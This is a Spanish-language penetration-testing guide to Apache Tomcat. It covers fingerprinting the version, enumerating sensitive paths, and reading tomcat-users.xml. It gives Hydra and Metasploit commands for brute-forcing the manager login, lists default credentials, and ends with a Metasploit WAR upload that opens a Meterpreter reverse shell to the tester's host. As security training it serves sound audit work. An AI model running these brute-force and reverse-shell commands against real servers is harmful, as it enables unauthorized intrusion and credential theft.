# tomcat

## Tomcat - Tecnology

### 🔍 **Auditoría de Apache Tomcat – Descubrimiento y Explotación**

**Apache Tomcat** es un servidor de aplicaciones ampliamente utilizado para ejecutar aplicaciones web en **Java**. Debido a su popularidad, es un objetivo frecuente en auditorías de seguridad y pruebas de penetración. En esta guía, exploraremos técnicas para **identificar la versión de Tomcat, enumerar usuarios y rutas sensibles, y explotar vulnerabilidades conocidas**.

***

#### 🕵️ **Identificación de la Versión de Apache Tomcat**

Determinar la versión del servidor es fundamental para detectar posibles vulnerabilidades. Podemos hacerlo de varias maneras:

#### **🔹 Reconocimiento con Nmap**

```bash
nmap -sV --script http-tomcat-enum <url>
```

#### **🔹 Reconocimiento con WhatWeb**

```bash
whatweb -v <url> # Muestra detalles de la versión detectada.
```

#### **🔹 Accediendo al Panel de Administración**

En muchos casos, la versión de **Tomcat** se puede encontrar directamente en su panel de administración:

```bash
http://<ip>:8080
```

Si la consola de administración es accesible, generalmente aparece en la página principal o en la sección "Server Status".

***

#### **✔ Check List - Apache Tomcat**

* [ ] /manager/html _(Consola de administración de Tomcat)_
* [ ] /host-manager/html _(Administrador de hosts virtuales)_
* [ ] /examples/ _(Directorio de ejemplos (puede contener código vulnerable)_
* [ ] /docs/ _(Documentación del servidor (posible información sensible)_
* [ ] /conf/tomcat-users.xml _(Archivo de configuración de usuarios)_
* [ ] /logs/ _(Registros del servidor)_
* [ ] /backups/ _(Posibles copias de seguridad accesibles)_

> \*💡 Importante: Si el acceso a estos directorios no está restringido, puede representar una vulnerabilidad grave.

***

#### **🔑 Enumeración de Usuarios en Apache Tomcat**

Tomcat almacena credenciales en `tomcat-users.xml`. Si tenemos acceso, podemos enumerar los usuarios configurados:

```bash
cat /etc/tomcat*/tomcat-users.xml
```

Si no tenemos acceso directo, podemos intentar un escaneo con `Metasploit`:

```bash
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS <url>
set USER_FILE /usr/share/wordlists/metasploit/tomcat_mgr_default_users.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

💡 Explicación:\
✔ `tomcat_mgr_login` → Escanea credenciales por defecto de Tomcat.\
✔ `USER_FILE` y `PASS_FILE` → Diccionarios de usuario y contraseña.

***

#### **🛠️ Ataque de Fuerza Bruta con Hydra**

Si encontramos el panel de login de Tomcat, podemos probar credenciales con **Hydra**:

```bash
hydra -L <usernames_wordlists.txt> -P <password_wordlist.txt> <url> http-get /manager/html
```

💡 Explicación: ✔ `-L` → Lista de usuarios.\
✔ `-P` → Diccionario de contraseñas.\
✔ `http-get /manager/html` → Ataca el login de Tomcat.

**Credenciales por defecto de Tomcat:**

* admin:admin
* tomcat:tomcat
* tomcat:s3cret
* root:root

#### **🛠 Subida de War Malicioso con Metasploit**

Si tenemos credenciales válidas en el **Manager**, podemos subir un archivo `.war` para obtener acceso remoto.

```bash
use exploit/multi/http/tomcat_mgr_deploy 
set RHOSTS <url>
set HTTPUSERNAME <usuario> 
set HTTPPASSWORD <contraseña> 
set PAYLOAD java/meterpreter/reverse_tcp 
set LHOST <tu_ip> 
set LPORT 4444 
exploit
```

***
